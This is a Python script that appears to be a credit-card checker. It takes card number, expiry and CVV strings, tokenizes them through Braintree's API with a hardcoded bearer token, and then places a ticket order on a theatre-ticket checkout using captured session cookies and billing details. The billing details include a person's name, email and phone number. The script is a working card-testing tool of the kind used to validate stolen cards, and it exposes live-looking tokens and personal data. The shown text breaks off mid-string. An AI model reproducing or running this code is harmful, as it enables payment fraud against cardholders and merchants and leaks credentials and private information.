import requests
import time
def Tele(cx):
	cc = cx.split("|")[0]
	mes = cx.split("|")[1]
	ano = cx.split("|")[2]
	cvv = cx.split("|")[3]
	if "20" in ano:
		ano = ano.split("20")[1]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjg3NTYxNTgsImp0aSI6IjVjYWU0YTY0LTk2NDQtNGNmZC1hYjQ2LTMzOGU4MjFjYzIwNiIsInN1YiI6InZmeHQ3cXRxc2g4M3Q2d3oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZmeHQ3cXRxc2g4M3Q2d3oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IlRpY2tldEZ1bGZpbGxtZW50U2VydmljZXNMUF9pbnN0YW50In19.NdmjOfiy1KFsvPTPF5iPZPaN6usZH6TIUcKJapOIpbZgyz-aHhKf0cxS0UgXGI-87flFSJNTmE3kC4TGQJxmFA',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '3e34b0dd-12a0-4a01-9d7e-30573626fd60',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': cc,
	                'expirationMonth': mes,
	                'expirationYear': ano,
	                'cvv': cvv,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	token=response.json()['data']['tokenizeCreditCard']['token']
	
	cookies = {
	    'rskxRunCookie': '0',
	    'rCookie': '3d17dff0yvc5bzlwvb02ctm144izh8',
	    'riskified-521': 'TFS-00e64a92-417a-400a-a800-bf107c17b9d2',
	    '_gcl_au': '1.1.855191243.1728672945.1641610729.1728672991.1728672991',
	    '_ga': 'GA1.1.524770896.1728672945',
	    '_clck': 'rbyyy6%7C2%7Cfpy%7C0%7C1719',
	    'c2-exp-580': '%7B%22userId%22%3A%222243aebf-611d-4c6c-abe8-be3a5fc58b5e%22%7D',
	    'returning-user-580': '%7B%22userId%22%3A%22190810e5-10af-43a3-85ca-9fcf00dcd02d%22%7D',
	    'scarab.visitor': '%222464D599AFD40161%22',
	    'checkout': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0dGwiOiIyMDI0LTEwLTEzVDA5OjQzOjExLjM4NTc2MyswMDowMCIsImF1dGhrZXkiOiJnQUFBQUFCbkNrU3Z3cllYQkpUYWMydWd3OGZVeEFSOEFxck9XLW51NnUzYy1Oa2UzRzJKUmxlUDZ0V1BzX185T0RybEEzT3kyNTdIUUh6cGUxVnM3ejROUlJMdDBZZ3Y3SjltTzdJNjNJbDFwc0Y5cE1RZlRENm9WNnl4Y0RfVXhxQXRjRU9yUFV0VCJ9.goOB8N7-R4mcoKsI67_M-yZSpiKICE0Zyju_XWEeKDU',
	    'x-correlation-id': '5d6254bc-29d2-41b2-92cb-ab5eb538e51c',
	    'lastRskxRun': '1728729748587',
	    '_ga_7SSTVQGFTE': 'GS1.1.1728728672.22.1.1728729750.0.0.0',
	    '_clsk': 'wde55m%7C1728729753132%7C9%7C1%7Cj.clarity.ms%2Fcollect',
	    '_ga_2BYGR1YGFT': 'GS1.1.1728728672.22.1.1728729774.24.0.1740476660',
	    '_ga_3L127RG4TY': 'GS1.1.1728728813.25.1.1728729774.0.0.0',
	    '_uetsid': 'c3b61d80880211efad4b3d90bc132f02',
	    '_uetvid': '7717a22073ae11efaae207f56d7f96a1',
	    '_ga_EPBQ8EVGXH': 'GS1.1.1728728810.32.1.1728729782.0.0.0',
	}
	
	headers = {
	    'authority': 'purchase.theatrelandamerica.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'baggage': 'sentry-environment=production,sentry-release=main%400d41c5,sentry-public_key=64a6d9c57b184c3e997b75736739cbb2,sentry-trace_id=e5546f278f0e4e57bfd820af063da3bb',
	    'content-type': 'application/json',
	    # 'cookie': 'rskxRunCookie=0; rCookie=3d17dff0yvc5bzlwvb02ctm144izh8; riskified-521=TFS-00e64a92-417a-400a-a800-bf107c17b9d2; _gcl_au=1.1.855191243.1728672945.1641610729.1728672991.1728672991; _ga=GA1.1.524770896.1728672945; _clck=rbyyy6%7C2%7Cfpy%7C0%7C1719; c2-exp-580=%7B%22userId%22%3A%222243aebf-611d-4c6c-abe8-be3a5fc58b5e%22%7D; returning-user-580=%7B%22userId%22%3A%22190810e5-10af-43a3-85ca-9fcf00dcd02d%22%7D; scarab.visitor=%222464D599AFD40161%22; checkout=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0dGwiOiIyMDI0LTEwLTEzVDA5OjQzOjExLjM4NTc2MyswMDowMCIsImF1dGhrZXkiOiJnQUFBQUFCbkNrU3Z3cllYQkpUYWMydWd3OGZVeEFSOEFxck9XLW51NnUzYy1Oa2UzRzJKUmxlUDZ0V1BzX185T0RybEEzT3kyNTdIUUh6cGUxVnM3ejROUlJMdDBZZ3Y3SjltTzdJNjNJbDFwc0Y5cE1RZlRENm9WNnl4Y0RfVXhxQXRjRU9yUFV0VCJ9.goOB8N7-R4mcoKsI67_M-yZSpiKICE0Zyju_XWEeKDU; x-correlation-id=5d6254bc-29d2-41b2-92cb-ab5eb538e51c; lastRskxRun=1728729748587; _ga_7SSTVQGFTE=GS1.1.1728728672.22.1.1728729750.0.0.0; _clsk=wde55m%7C1728729753132%7C9%7C1%7Cj.clarity.ms%2Fcollect; _ga_2BYGR1YGFT=GS1.1.1728728672.22.1.1728729774.24.0.1740476660; _ga_3L127RG4TY=GS1.1.1728728813.25.1.1728729774.0.0.0; _uetsid=c3b61d80880211efad4b3d90bc132f02; _uetvid=7717a22073ae11efaae207f56d7f96a1; _ga_EPBQ8EVGXH=GS1.1.1728728810.32.1.1728729782.0.0.0',
	    'origin': 'https://purchase.theatrelandamerica.com',
	    'partnerid': '580',
	    'referer': 'https://purchase.theatrelandamerica.com/checkout?productionId=5112264&ticketId=VB10839135821&wsUser=580&wsVar=%7C%7C%7Cpr_345076bozt&affiliateRedirectURL=https%3A%2F%2Fwww.bozemantheater.com%2Fshows%2Fthe-elm%2Fcorb-lund%2Ftickets%2Fseating%3Fperformance_id%3D5112264%26performance_time%3D2024-10-31T20%3A00%3A00%2B00%3A00&showAllInPricing=false&quantity=1&_gl=1*ysimkh*_gcl_au*ODU1MTkxMjQzLjE3Mjg2NzI5NDUuMTY0MTYxMDcyOS4xNzI4NjcyOTkxLjE3Mjg2NzI5OTE.*_ga*NTI0NzcwODk2LjE3Mjg2NzI5NDU.*_ga_2BYGR1YGFT*MTcyODcyODY3Mi4yMi4xLjE3Mjg3Mjg4MDQuNjAuMC4xNzQwNDc2NjYw*_ga_7SSTVQGFTE*MTcyODcyODY3Mi4yMi4xLjE3Mjg3Mjg3OTkuMC4wLjA.',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'sentry-trace': 'e5546f278f0e4e57bfd820af063da3bb-947a800b48b59211-1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'accertify': '0400bpNfiPCR/AUNf94lis1zttBaVgjxlOd9+hAUULEn4igg6f3aL7bxuW1ijfZmHgdO9NzXeVp7vEZYzo/BhZInyvHOs+Nkwbln8Efin9D8liyLLJ/akN7kT0nbtw2dg9JBTIBnmyVMxonI+3VOlPszDyGNO0aIaxxzjwZOoEVFPaYRTfzsuPzNXCJAc+Qb+DygZqVY9/X9EWD6xu/MPn/uTiKHQYQjvJPz3/seKcOlvXrGxhKauwqEWLxUN0sYF8r08f8uCcC0xODcb+CqMKE6vbtJ3TeLA0/4WxFj2eUopXvN+/2MpoyjolSAFu7g0I1z9QmIvkwaq97WjVkxQPfCtRQiTB9x3I5+sc6jkKxzsgSjfj+XLbPxuC3egcD8ofobcO0hRN7nkVClUZAaTWC+ZTzmHvOZVxQkTdpKytzIitWiLZVX2oRcAEJI4/wX97IAaVmZqTD7tyd0W8+tYgTFPmW7mOwK7WDcCz2tV/EqaFopQs/EGzmZL+SvY3JSvH6St2uaCV+vRab/lWKc5uROuv6a+9aA+etanzlZKp9bEmwH5dqwsrXVIr67oiEQoH0thCiebBE66IIElXD0hEMtvQl2olrNgUNPm9SKaKv8nVvGInrBs5KtrjntEcVmW1kMYttRthViDqmLnoTEMF89GEsFV/MYI/0uTy5F2oT0CiJcdEMTznnjef10F4hyuT+Zl+3ihnHCw1hmpVj39f0RYPrG78w+f+5OIodBhCO8k/Pf+x4pw6W9esbGEpq7CoRYvFQ3SxgXyvTx/y4JwLTE4Nxv4KowoTq9u0ndN4sDT/hbEWPZ5Sile837/YymjKOiVIAW7uDQjXPJ5KZOY+8O2Z5lbKwbkY1WLiLEJ4zNTnk1gG7+dJK6MOC0AaFIpHNcMzppCn4QH/KPaqS7dmS/ORnm5PgEjUkuUsHozl+XYShmK7Ltd63OEQm68rvRvAGkcYv1IEAR88cgjzea3qJWwAYH9Ct2eRBvupX/mS6sXhzYXo3BTCX2hioT9A1DShgAII3rIFYGboIjUfp6l30qniRPynpo76wvpk2UmcqfCQ5wPpPV0ZSMvzVqqgOcjW28BEpvn84bwRcdMryxg1BfjOvpD8oApkQGpXVfx1PqhwPd/JScMkXzq5YstdZ3m/rUCDqW28RxknsBnpkKYW66l1UE7Y6z6CwoceLu0n/HakSilc4wxEMVcMzsGIUFh6grhz5pwpTTL3EJ/d2WH7HyWSrJxO1E0udcLu5vW5U2hmeu0L2IFedoFkVZPoRga4aoUz1rpuoqUUhGvWm5lSpMPg==',
	    'altPaymentNonce': token,
	    'event': {
	        'id': 5112264,
	        'image': 'https://d1gwnrwaeu7bya.cloudfront.net/mobile/app/category/country.jpg',
	        'name': 'Corb Lund',
	        'performers': [
	            {
	                'id': 30674,
	                'name': 'Corb Lund',
	                'disclaimer': None,
	                'is_home': True,
	                'is_primary': True,
	            },
	        ],
	        'utc_date': '2024-11-01T02:00:00+00:00',
	        'local_date': '2024-10-31T20:00:00',
	        'venue': {
	            'id': 27585,
	            'image': None,
	            'images': [],
	            'latitude': 45.684721,
	            'longitude': -111.045732,
	            'name': 'The Elm',
	            'timezone': 'US/Mountain',
	            'address': '506 N Seventh Avenue',
	            'city': 'Bozeman',
	            'state_code': 'MT',
	            'state': 'Montana',
	            'postal_code': '59715',
	            'country_code': 'US',
	            'country': 'United States',
	            'region_id': 121,
	            'map': None,
	            'static_map': None,
	            'disclaimer': None,
	        },
	        'supplemental_data': {
	            'event_description': None,
	            'performer_images': None,
	        },
	        'is_expired': False,
	        'is_ga': None,
	        'is_lmlp': None,
	        'is_date_tbd': False,
	        'is_time_tbd': False,
	        'olson_timezone': 'US/Mountain',
	        'price': {
	            'currency': 'USD',
	            'min': 41,
	            'max': 284,
	        },
	        'taxonomy': {
	            'genre': 'Country and Folk',
	            'segment': 'Concerts',
	            'sub_genre': None,
	        },
	        'updated_at': None,
	        'disclaimer': None,
	        'display_checkout_disclaimer': False,
	        'listing_count': 22,
	        'tags': None,
	        'exclusive_listing_count': 0,
	        'ticket_count': 125,
	        'pre_select_delivery_method': False,
	    },
	    'fromMobile': True,
	    'formState': {
	        'deliveryCountry': 'US',
	        'deliveryMethod': {
	            'id': 26,
	            'cost': 7.5,
	            'description': 'Electronic Transfer',
	            'shortDescription': 'Electronic Transfer',
	            'requiresShippingInfo': False,
	            'display': {
	                'confirmationHeader': 'Mobile Access',
	                'confirmation': [
	                    'Instructions on how to access your tickets will be emailed to {{customerEmail}} when your tickets are released',
	                    'Typically tickets are released quickly, but some venues withhold tickets until 48 hours prior to the event',
	                    'Tickets must be displayed on your iOS or Android device to gain access to the event',
	                ],
	                'deliveryMethod': 'Electronic Transfer is a secure and simple method to transfer paperless tickets. When the seller initiates the ticket transfer, you will receive an email or text containing instructions to claim the tickets on your phone. Please note that you will need to use an iOS or Android mobile device to gain entry to your event.',
	                'listings': 'Mobile Ticket',
	                'listingDetails': 'Mobile Access - Access your tickets and easily gain entry with your iOS or Android device',
	                'tip': 'How will I receive my tickets?',
	            },
	            'printAtHome': False,
	        },
	        'emailAddress': 'hafezg93@gmail.com',
	        'matchingEmailAddress': 'hafezg93@gmail.com',
	        'isSubscribed': False,
	        'paymentMethod': 'credit_card',
	        'billingSameAsShipping': False,
	        'billingAddress': {
	            'firstName': 'Mohamed',
	            'lastName': 'Hamdy',
	            'company': '',
	            'mobilePhone': '5162582584',
	            'alternatePhone': '',
	            'line1': 'New York',
	            'line2': '',
	            'city': 'New York',
	            'state': 'NY',
	            'zip': '10080',
	            'country': 'US',
	        },
	        'shippingAddress': {
	            'firstName': '',
	            'lastName': '',
	            'company': '',
	            'mobilePhone': '',
	            'alternatePhone': '',
	            'line1': '',
	            'line2': '',
	            'city': '',
	            'state': '',
	            'zip': '',
	            'country': 'US',
	        },
	        'purchaseError': '',
	        'termsAgreement': True,
	        'isDuplicateOrder': False,
	        'insuranceChoice': {
	            'quoteId': '4302350300003019471',
	            'declination': True,
	            'individualPrice': 0,
	            'totalPrice': 0,
	            'html': None,
	            'productCode': 'NoProduct',
	            'offerSequenceNumber': 1,
	        },
	        'payerEmailAddress': '',
	        'wasEmailPrefilled': False,
	        'submission': 0,
	        'isValid': False,
	        'shippingMessage': None,
	        'beaconSessionId': 'TFS-00e64a92-417a-400a-a800-bf107c17b9d2',
	    },
	    'insuranceOffer': {
	        'body': None,
	        'callToAction': None,
	        'disclaimer': None,
	        'footer': None,
	        'header': None,
	        'intro': None,
	        'quotePackID': '4302350300003019473',
	        'templateId': 'TMPL_31931',
	        'treatmentId': '1229151',
	        'insuranceOfferHtml': '<div class="widget  ticketInsurance" style="display: block;">\n    <div class="widgetTitle">\n        <span class="head-title">\n            EVENT TICKET PROTECTION\n        </span>\n        <span onclick="stopPropagation(event);" class="widgetTitleToolBar"></span>\n    </div>\n    <div class="widgetContent">\n        <div class="form-horizontal widget-push">\n            <p>\n<strong>Get reimbursed up to 100%</strong> of your ticket purchase <strong>for $7.00 total</strong> (including taxes, fees, parking or other event-related items in your order) if you can\'t attend your event for a number of covered reasons&mdash;such as a covered illness, injury, airline delay, traffic accident, mechanical breakdown, or weather emergency.\n</p>\n\n<p>Recommended/offered/sold by Allianz Global Assistance. Underwriter: Jefferson Insurance Company. Plan incl. insurance & assistance services. Terms & exclusions (incl. for pre-existing conditions) apply. <a href=\'https://www.allianzworldwidepartners.com/usa/terms-and-conditions/001006274\' target=\'_blank\'>Plan & Pricing details, disclosures, Coverage Alerts<span class=\'agaHidden-accessible\'> Learn more about terms and conditions. Link opens in a new window.</span></a>\n<style>.agaHidden-accessible {border: 0 none;clip: rect(0px,0px,0px,0px);height: 1px;margin: -1px;overflow: hidden;padding: 0;position: absolute;width: 1px;}</style>. Insurance billed separately through Allianz Global Assistance.</p>\n            <div class="control-group">\n                <div class="controls" style="margin-left:0;">\n                        <label for="insuranceOption0" class="radio" style="padding: 9px 5px 7px; background-color:#f5f5f5;">\n<input id="insuranceOption0" parsley-error-container="#insuranceError.parsley-error-list" name="insuranceOption" value="4302350300003019470" class="radio required" type="radio" parsley-error-message="You must accept or decline insurance" style="margin: 1px 5px;">\n<span id="insuranceOptionText0" class="allianz-optText"><strong>Yes,</strong> <span style="font-weight:normal;">protect my ticket purchase to Corb Lund at The Elm. </span><span class="agaCheckmark"> Highly Recommended</span></span>\n<span id="agaInsuranceSelected"><span class="agaCheckmark"> </span><span class="allianz-optText">Great choice. Your ticket purchase is protected!</span></span>\n</label>\n                        <label for="insuranceOption1" class="radio" style="padding: 9px 5px 7px;">\n<input id="insuranceOption1" name="insuranceOption" value="4302350300003019471" class="radio" type="radio" style="margin: 0 10px 0 5px;" isDecline>\n<span id="insuranceOptionText1" class="allianz-optText">\n<span style="font-weight:normal;">No, don\'t protect my ticket purchase.</span>\n</span>\n<span id="agaInsuranceDeclined">\n<span class="allianz-optText">Are you sure? Your ticket purchase is not protected.</span>\n</span>\n<p id="allianz-dynPolicy" style="margin-left:27px;">\n<img src="https://gateway.americas.allianz-assistance.com/images/people-black.png" width="18px" height="auto" style="vertical-align: top;transform: translateY(40%); margin-top:-4px;">\n&nbsp;&nbsp;8,453 people protected their tickets in the last 7 days\n</p>\n</label>\n<span id="insuranceError" class="parsley-error-list"></span>\n<span class="parsley-error-list"></span>\n                </div>\n            </div>\n            <p class="disclaimer-text">\n                \n            </p>\n        </div>\n    </div>\n</div>\n<style>\n                                        .ticketInsurance .allianz-green {\n                                            color: #008000;\n                                        }\n                                        .ticketInsurance .allianz-red {\n                                            color: red;\n                                        }\n                                        /* SOCIAL PROOF */\n                                        .ticketInsurance .allianz-socialProof {\n                                            padding-top: 8px;\n                                            display: flex;\n                                            align-items: end;\n                                            color: #008000;\n                                        }\n                                        .ticketInsurance .allianz-people {\n                                            width: 18px;\n                                        }\n                                        /* Social proof with "img" */\n                                        .ticketInsurance #allianz-dynPolicy {\n                                            padding-top: 8px;\n                                            margin-left: 22px;\n                                        }\n                                        /* REVIEW PERIOD TOOLTIP */\n                                        .ticketInsurance #azp-tooltip-checkbox {\n                                            position: absolute;\n                                            opacity: 0;\n                                        }\n                                        .ticketInsurance .azp-tooltip {\n                                            display: inline-flex;\n                                            align-items: baseline;\n                                        }\n                                        .ticketInsurance .azp-tooltip-link {\n                                            margin-left: 0.25rem;\n                                            margin-top: 0;\n                                            color: #50b3d6;\n                                            width: max-content;\n                                            cursor: pointer;\n                                        }\n                                        .ticketInsurance .azp-tooltip-text {\n                                            background-color: #fff;\n                                            border: 1px solid rgba(0,0,0,.2);\n                                            border-radius: 6px;\n                                            box-shadow: 0 5px 10px rgba(0,0,0,0.2);\n                                            -webkit-box-shadow: 0 5px 10px rgba(0,0,0,0.2);\n                                            padding: 24px 20px;\n                                            font-size: 0.786em;\n                                            line-height: 1.636em;\n                                            width: 400px;\n                                        }\n                                        .ticketInsurance .azp-tooltip-icon {\n                                            font-family: FontAwesome;\n                                        }\n                                        .ticketInsurance .azp-tooltip-icon i {\n                                            color: #50b3d6;\n                                            font-size: 1.5rem;\n                                        }\n                                        .ticketInsurance #azp-tooltip-label:hover > .azp-tooltip-icon i, .ticketInsurance #azp-tooltip-label:focus > .azp-tooltip-icon i, .ticketInsurance .azp-tooltip-link:hover, .ticketInsurance .azp-tooltip-link:focus {\n                                            color: #2a6496;\n                                        }\n                                        .ticketInsurance .azp-tooltip-close {\n                                            color: #000;\n                                            font-size: 14px;\n                                            font-weight: 700;\n                                            line-height: 1;\n                                            text-shadow: 0 1px 0 #fff;\n                                            opacity: 0.2;\n                                        }\n                                        .ticketInsurance .azp-tooltip-close:hover, .ticketInsurance .azp-tooltip-close:focus {\n                                            opacity: 0.5;\n                                        }\n                                        .ticketInsurance label.azp-tooltip-close-link {\n                                            text-align: right;\n                                            width: 100%;\n                                            position: absolute;\n                                            right: 10px;\n                                            top: 5px;\n                                        }\n                                        .ticketInsurance .azp-tooltip-window {\n                                            display: none;\n                                            position: absolute;\n                                            margin-bottom: 3rem!important;\n                                            margin-left: 16.75rem;\n                                            align-self: flex-end;\n                                        }\n                                        .ticketInsurance input#azp-tooltip-checkbox:checked + .azp-tooltip-link + .azp-tooltip-window {\n                                            display: block;\n                                            outline: none;\n                                        }\n                                        .ticketInsurance .azp-tooltip-arrow {\n                                            border-bottom: 1px solid rgba(0,0,0,0.2);\n                                            border-right: 1px solid rgba(0,0,0,0.2);\n                                            background-color: #fff;\n                                            width: 14px;\n                                            height: 14px;\n                                            transform: rotate(45deg);\n                                            margin-top: -7px;\n                                            margin-left: 1.5rem;\n                                        }\n                                        /* Icons */\n                                        .agaCheckmark {\n                                            display: inline-block;\n                                            color: #008000;\n                                            font-weight: 700;\n                                            margin-left: 10px;\n                                        }\n                                        .agaCheckmark:before {\n                                            content: \'\';\n                                            display: inline-block;\n                                            width: 5px;\n                                            height: 10px;\n                                            border: solid #008000;\n                                            border-width: 0 4px 4px 0;\n                                            transform: rotate(45deg);\n                                            margin-right: 4px;\n                                        }\n                                        /* SVGs */\n                                        #agacheckmark {\n                                            fill: #008000;\n                                            width: 12px;\n                                            height: 12px;\n                                        }\n                                        #agaexclamtri {\n                                            width: 12px;\n                                            height: 12px;\n                                            fill: #cf071e!important;\n                                        }\n                                        .gaexclamtripoint {\n                                            fill: #ffffff;\n                                        }\n                                        /* YES/NO INTERACTIVITY */\n                                        #agaInsuranceSelected,\n                                        #agaInsuranceDeclined {\n                                            display:none;\n                                            font-weight:bold;\n                                        }\n                                        #insuranceOption0:checked ~ #agaInsuranceSelected,\n                                        #insuranceOption1:checked ~ #agaInsuranceDeclined {\n                                            display:inline-block;\n                                        }\n                                        #insuranceOption0:checked ~ #insuranceOptionText0,\n                                        #insuranceOption1:checked ~ #insuranceOptionText1,\n                                        .allianz-hiddenSelected:checked {\n                                            display:none;\n                                        }\n                                        #insuranceOptionText0.allianz-optText,\n                                        .allianz-hiddenSelected ~ #agaInsuranceDeclined {\n                                            margin-left: 5px;\n                                        }\n                                        .allianz-hiddenSelected ~ #agaInsuranceSelected .agaCheckmark:before {\n                                            margin-right: 0;\n                                        }\n                                        #agaInsuranceSelected .allianz-optText {\n                                            margin-left: 10px;\n                                        }\n                                        #agaInsuranceDeclined.allianz-optText,\n                                        #agaInsuranceDeclined .allianz-optText {\n                                            margin-left: 7px;\n                                        }\n                                        .allianz-optText + #allianz-dynPolicy,\n                                        .allianz-hiddenSelected ~ #allianz-dynPolicy {\n                                            margin-left: 27px;\n                                        }\n                                    </style>\n<div style="display:none !important;">\n\t<input type="hidden" value=1229151 id="agaTreatmentID" />\n\t<input type="hidden" value=Champion id="agaOfferType" />\n\t<input type="hidden" value=SGMT_23551  id="agaSegmentCode" />\n</div>',
	        'options': [
	            {
	                'quoteId': '4302350300003019470',
	                'declination': False,
	                'individualPrice': 7,
	                'totalPrice': 7,
	                'html': None,
	                'productCode': '001006274',
	                'offerSequenceNumber': 0,
	            },
	            {
	                'quoteId': '4302350300003019471',
	                'declination': True,
	                'individualPrice': 0,
	                'totalPrice': 0,
	                'html': None,
	                'productCode': 'NoProduct',
	                'offerSequenceNumber': 1,
	            },
	        ],
	    },
	    'listing': {
	        'eventId': 5112264,
	        'pricePer': 51,
	        'isSpec': False,
	        'stockType': {
	            'key': 'ticketmaster transfer',
	            'value': 'ticketmaster transfer',
	        },
	        'currency': 'USD',
	        'eticket': False,
	        'id': 'VB10839135821',
	        'inHandDate': '2024-10-29T05:00:00+00:00',
	        'notes': 'Please note that you will need to use an iOS or Android mobile device to gain entry to your event.',
	        'allInPrice': None,
	        'priceBreakdown': None,
	        'quantities': [
	            6,
	            5,
	            4,
	            3,
	            2,
	            1,
	        ],
	        'quantity': 6,
	        'row': 'GA',
	        'seating': {
	            'row': 'GA',
	            'seatViewImageUrl': None,
	            'section': 'GA Floor - SRO',
	            'sectionId': '2395433',
	            'view': None,
	            'panoramicView': None,
	        },
	        'section': 'GA Floor - SRO',
	        'seatingViewImageUrl': None,
	        'brokerId': '27972',
	        'verboseSectionName': 'GA Floor - SRO',
	        'faceValue': None,
	        'showFaceValue': False,
	        'showAllInPrice': False,
	        'featured': False,
	    },
	    'paymentNonce': token,
	    'pricing': {
	        'id': 'd23eba54-68e1-4603-8e41-e87de4124486',
	        'ticketList': [
	            {
	                'quantity': 1,
	                'listingId': 'VB10839135821',
	                'productionId': 5112264,
	                'deliveryMethodId': 26,
	                'exclusiveListing': False,
	                'customPricing': None,
	                'unitPrice': 51,
	                'serviceCharge': 7.65,
	                'seats': [
	                    '',
	                ],
	            },
	        ],
	        'duplicatedOrders': [],
	        'salesTax': 0,
	        'promo': None,
	        'giftCards': None,
	        'storeCredit': None,
	        'insuranceOffer': {
	            'body': None,
	            'callToAction': None,
	            'disclaimer': None,
	            'footer': None,
	            'header': None,
	            'intro': None,
	            'quotePackID': '4302350300003019473',
	            'templateId': 'TMPL_31931',
	            'treatmentId': '1229151',
	            'insuranceOfferHtml': '<div class="widget  ticketInsurance" style="display: block;">\n    <div class="widgetTitle">\n        <span class="head-title">\n            EVENT TICKET PROTECTION\n        </span>\n        <span onclick="stopPropagation(event);" class="widgetTitleToolBar"></span>\n    </div>\n    <div class="widgetContent">\n        <div class="form-horizontal widget-push">\n            <p>\n<strong>Get reimbursed up to 100%</strong> of your ticket purchase <strong>for $7.00 total</strong> (including taxes, fees, parking or other event-related items in your order) if you can\'t attend your event for a number of covered reasons&mdash;such as a covered illness, injury, airline delay, traffic accident, mechanical breakdown, or weather emergency.\n</p>\n\n<p>Recommended/offered/sold by Allianz Global Assistance. Underwriter: Jefferson Insurance Company. Plan incl. insurance & assistance services. Terms & exclusions (incl. for pre-existing conditions) apply. <a href=\'https://www.allianzworldwidepartners.com/usa/terms-and-conditions/001006274\' target=\'_blank\'>Plan & Pricing details, disclosures, Coverage Alerts<span class=\'agaHidden-accessible\'> Learn more about terms and conditions. Link opens in a new window.</span></a>\n<style>.agaHidden-accessible {border: 0 none;clip: rect(0px,0px,0px,0px);height: 1px;margin: -1px;overflow: hidden;padding: 0;position: absolute;width: 1px;}</style>. Insurance billed separately through Allianz Global Assistance.</p>\n            <div class="control-group">\n                <div class="controls" style="margin-left:0;">\n                        <label for="insuranceOption0" class="radio" style="padding: 9px 5px 7px; background-color:#f5f5f5;">\n<input id="insuranceOption0" parsley-error-container="#insuranceError.parsley-error-list" name="insuranceOption" value="4302350300003019470" class="radio required" type="radio" parsley-error-message="You must accept or decline insurance" style="margin: 1px 5px;">\n<span id="insuranceOptionText0" class="allianz-optText"><strong>Yes,</strong> <span style="font-weight:normal;">protect my ticket purchase to Corb Lund at The Elm. </span><span class="agaCheckmark"> Highly Recommended</span></span>\n<span id="agaInsuranceSelected"><span class="agaCheckmark"> </span><span class="allianz-optText">Great choice. Your ticket purchase is protected!</span></span>\n</label>\n                        <label for="insuranceOption1" class="radio" style="padding: 9px 5px 7px;">\n<input id="insuranceOption1" name="insuranceOption" value="4302350300003019471" class="radio" type="radio" style="margin: 0 10px 0 5px;" isDecline>\n<span id="insuranceOptionText1" class="allianz-optText">\n<span style="font-weight:normal;">No, don\'t protect my ticket purchase.</span>\n</span>\n<span id="agaInsuranceDeclined">\n<span class="allianz-optText">Are you sure? Your ticket purchase is not protected.</span>\n</span>\n<p id="allianz-dynPolicy" style="margin-left:27px;">\n<img src="https://gateway.americas.allianz-assistance.com/images/people-black.png" width="18px" height="auto" style="vertical-align: top;transform: translateY(40%); margin-top:-4px;">\n&nbsp;&nbsp;8,453 people protected their tickets in the last 7 days\n</p>\n</label>\n<span id="insuranceError" class="parsley-error-list"></span>\n<span class="parsley-error-list"></span>\n                </div>\n            </div>\n            <p class="disclaimer-text">\n                \n            </p>\n        </div>\n    </div>\n</div>\n<style>\n                                        .ticketInsurance .allianz-green {\n                                            color: #008000;\n                                        }\n                                        .ticketInsurance .allianz-red {\n                                            color: red;\n                                        }\n                                        /* SOCIAL PROOF */\n                                        .ticketInsurance .allianz-socialProof {\n                                            padding-top: 8px;\n                                            display: flex;\n                                            align-items: end;\n                                            color: #008000;\n                                        }\n                                        .ticketInsurance .allianz-people {\n                                            width: 18px;\n                                        }\n                                        /* Social proof with "img" */\n                                        .ticketInsurance #allianz-dynPolicy {\n                                            padding-top: 8px;\n                                            margin-left: 22px;\n                                        }\n                                        /* REVIEW PERIOD TOOLTIP */\n                                        .ticketInsurance #azp-tooltip-checkbox {\n                                            position: absolute;\n                                            opacity: 0;\n                                        }\n                                        .ticketInsurance .azp-tooltip {\n                                            display: inline-flex;\n                                            align-items: baseline;\n                                        }\n                                        .ticketInsurance .azp-tooltip-link {\n                                            margin-left: 0.25rem;\n                                            margin-top: 0;\n                                            color: #50b3d6;\n                                            width: max-content;\n                                            cursor: pointer;\n                                        }\n                                        .ticketInsurance .azp-tooltip-text {\n                                            background-color: #fff;\n                                            border: 1px solid 